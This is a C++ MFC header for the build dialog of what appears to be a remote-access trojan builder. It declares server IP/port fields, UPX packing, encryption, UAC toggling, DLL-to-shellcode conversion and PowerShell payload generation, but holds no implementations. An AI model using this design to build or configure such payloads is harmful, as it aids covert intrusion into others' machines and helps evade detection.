#pragma once
#include "DllToShellCode.h"




class CBuildDlg : public CXTPResizeFormView
{
	DECLARE_DYNCREATE(CBuildDlg)
public:

	CBuildDlg();
	virtual ~CBuildDlg();
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_BUILD };
#endif
#ifdef _DEBUG
	virtual void AssertValid() const;
#ifndef _WIN32_WCE
	virtual void Dump(CDumpContext& dc) const;
#endif
#endif
	virtual void OnInitialUpdate();
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	DECLARE_MESSAGE_MAP()
public:
	CString m_edit_ip;
	CString m_edit_ip2;
	CString m_edit_ip3;
	CString m_edit_port;
	CString m_edit_port2;
	CString m_edit_port3;
	CComboBox h_combo_net;
	CComboBox h_combo_net2;
	CComboBox h_combo_net3;
	CString m_edit_first_time;
	CString m_edit_rest_time;
	CString m_edit_g;
	CString m_edit_v;
	CString m_edit_dll;
	CButton h_radio_h;
	CString m_edit_en;
	CEdit m_edit_tip;
	CListCtrl m_list_set;
	CString m_edit_powershell;
	CButton m_Dragupx;
	CButton m_Dragen;
	CButton m_Dragbyte;
	CStatic m_Draguac;
	CStatic m_Dragdll2shellcode;
	bool m_buildonce;
	int drop;
	CStringA code; //存放powershell命令
	TCHAR writepath[MAX_PATH];
	TCHAR confi[1000];
	BOOL build(int mode);

	BOOL getsettingdata();
	void Setfindinfo(CString& s, const TCHAR* f1, TCHAR* outstring, BOOL user);
	BOOL changedataandwritefile(CString path,BOOL bchangeexport=FALSE);
	int memfind(const char* mem, const char* str, int sizem, int sizes);
	int memfind(const char* mem, const TCHAR* str, int sizem, int sizes);
	void upx(TCHAR* filePath);
	void encrypt(TCHAR* filePath);
	void change(TCHAR* filePath);
	void addordeluac(TCHAR* filePath);
	void dll2shellcode(TCHAR* filePath);

	void writerresour(int lpszType, LPCTSTR RName, LPCTSTR lpszName); //写出资源文件
	//shellcode
	BOOL changeshellcodeandwritefile(CString path);
	//powershell
	 BOOL changepowershellandwritefile(CString path32, CString path64,bool b_isx86);


	 static bool initpowershellcode();


	 void WritepowershellInfo();
	 void Writepowershellcmd();

	void WritePortInfo();
	unsigned char* base64_encode(unsigned char* str, DWORD str_len);
	unsigned char* base64_decode(unsigned char* code);
	BOOL SetComd(char* buff, DWORD size);
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	afx_msg void OnDropFiles(HDROP hDropInfo);
	afx_msg void OnClickListSet(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnBnClickedBuildexe();
	afx_msg void OnBnClickedBuilddll();
	afx_msg void OnRclick(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnBnClickedButtonAddServer();
	afx_msg void OnBnClickedButtonAddServer2();
	afx_msg void OnBnClickedButtonAddServer3();
	afx_msg void OnBnClickedBuildShellcode();
	afx_msg void OnBnClickedBuildPowershell();
	afx_msg void OnBnClickedBuildPowershellSet();
	afx_msg void OnBnClickedButtonPowershellGet();
	afx_msg void OnBnClickedButtonDecode();
	afx_msg void OnBnClickedButtonEncode();
	afx_msg void OnBnClickedButtonPowershellOut();
	

	


	
};



